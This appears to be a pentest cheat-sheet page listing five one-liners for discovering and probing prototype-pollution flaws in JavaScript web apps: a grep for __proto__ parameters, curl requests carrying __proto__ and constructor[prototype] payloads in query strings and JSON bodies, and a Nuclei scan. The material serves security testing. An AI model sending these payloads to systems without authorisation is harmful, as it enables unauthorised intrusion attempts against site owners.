# Prototype Pollution

Short discovery and probe one-liners for JavaScript prototype-pollution surfaces.

<div class="ol-section-kicker"><span>WEB</span><strong>5 one-liners</strong></div>

## Find prototype-related parameters

```bash
grep -Ei "(__proto__|constructor|prototype)" urls.txt | sort -u
```

**Tool:** grep · **Platform:** Linux · **Tags:** Web, prototype pollution · **Context:** User

## Query-string __proto__ probe

```bash
curl -sk "https://<TARGET>/?__proto__[polluted]=true"
```

**Tool:** curl · **Platform:** Any · **Tags:** Web, prototype pollution · **Context:** No auth

## Constructor prototype probe

```bash
curl -sk "https://<TARGET>/?constructor[prototype][polluted]=true"
```

**Tool:** curl · **Platform:** Any · **Tags:** Web, prototype pollution · **Context:** No auth

## JSON body probe

```bash
curl -sk -X POST https://<TARGET>/<ENDPOINT> -H "Content-Type: application/json" -d '{"__proto__":{"polluted":"true"}}'
```

**Tool:** curl · **Platform:** Any · **Tags:** Web, prototype pollution, JSON · **Context:** Authenticated

## Nuclei prototype pollution templates

```bash
nuclei -u https://<TARGET> -tags prototype-pollution -silent
```

**Tool:** Nuclei · **Platform:** Linux · **Tags:** Web, prototype pollution · **Context:** No auth

---

**Related:** JavaScript · APIs & GraphQL · Parameters
